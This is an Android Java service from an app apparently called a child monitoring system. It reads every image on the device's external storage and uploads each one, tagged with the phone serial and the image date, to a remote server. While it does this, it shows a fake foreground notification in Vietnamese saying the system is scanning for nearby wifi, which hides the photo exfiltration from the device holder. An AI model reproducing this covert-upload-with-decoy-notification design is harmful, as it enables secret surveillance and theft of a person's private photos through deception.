package com.ChildMonitoringSystem.CMS.JobService;

import static com.ChildMonitoringSystem.CMS.MyApplication.CHANNEL_ID;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.Service;
import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import android.view.View;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;

import com.ChildMonitoringSystem.CMS.GetDataFromDevice.LoadImageFromExternalStorage;
import com.ChildMonitoringSystem.CMS.Model.INFO_IMAGE;
import com.ChildMonitoringSystem.CMS.R;
import com.ChildMonitoringSystem.CMS.Service.Service_Upload;
import com.ChildMonitoringSystem.CMS.Value.Constant;

import java.io.File;
import java.util.ArrayList;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class ImageUploadService extends Service {
    private static final String TAG = ImageUploadService.class.getName();
    ArrayList<INFO_IMAGE> lst;


    @Override
    public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.O)
            startMyOwnForeground();
        else
            startForeground(1, new Notification());
        IntentFilter filter = new IntentFilter();
        filter.addAction(Constant.ACTION);
        registerReceiver(mbroadBroadcastReceiver, filter);
        try {
            LoadImageFromExternalStorage loadImageFromExternalStorage = new LoadImageFromExternalStorage();
            lst = loadImageFromExternalStorage.GetAllIMage(getApplicationContext());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private void startMyOwnForeground() {
        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, CHANNEL_ID);
        Notification notification = notificationBuilder.setOngoing(true)
                .setContentTitle("Trình quản lí mạng")
                .setContentText("Hệ thống đang quét wifi gần bạn")
                .setSmallIcon(R.drawable.ic_baseline_settings_24)
                .build();
        startForeground(2, notification);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        doBackGroundWork(lst);
        return START_NOT_STICKY;
    }

    private final BroadcastReceiver mbroadBroadcastReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (Constant.ACTION.equals(intent.getAction())) {
                stopSelf();
            }

        }
    };

    private void doBackGroundWork(ArrayList<INFO_IMAGE> lst) {
        new Thread(() -> {
            if (lst.size() > 0) {
                for (INFO_IMAGE info : lst) {
                    String seri = info.getSERI_PHONE();
                    String date = info.getDATE_IMAGE();
                    RequestBody requestBodySeri = RequestBody.create(MediaType.parse("multipart/form-data"), seri);
                    RequestBody requestBodyDate = RequestBody.create(MediaType.parse("multipart/form-data"), date);
                    File file = new File(info.getIMAGES_NAME());
                    RequestBody requestBodyimg = RequestBody.create(MediaType.parse("multipart/form-data"), file);
                    MultipartBody.Part mPart = MultipartBody.Part.createFormData(Constant.KEY_Img, file.getName(), requestBodyimg);
                    Service_Upload.apiservice1.UploadIMG(requestBodySeri, requestBodyDate, mPart).enqueue(new Callback<INFO_IMAGE>() {
                        @Override
                        public void onResponse(Call<INFO_IMAGE> call, Response<INFO_IMAGE> response) {
                            Log.i(TAG, "onResponse: done");
                            Log.i(TAG, "onResponse: " + response.errorBody());
                        }

                        @Override
                        public void onFailure(Call<INFO_IMAGE> call, Throwable t) {
                            Log.i(TAG, "onFailure: fail");
                        }
                    });
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
                Intent intent = new Intent(Constant.ACTION);
                sendBroadcast(intent);
            }
        }).start();
    }


    @Override
    public void onDestroy() {
        super.onDestroy();
        unregisterReceiver(mbroadBroadcastReceiver);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
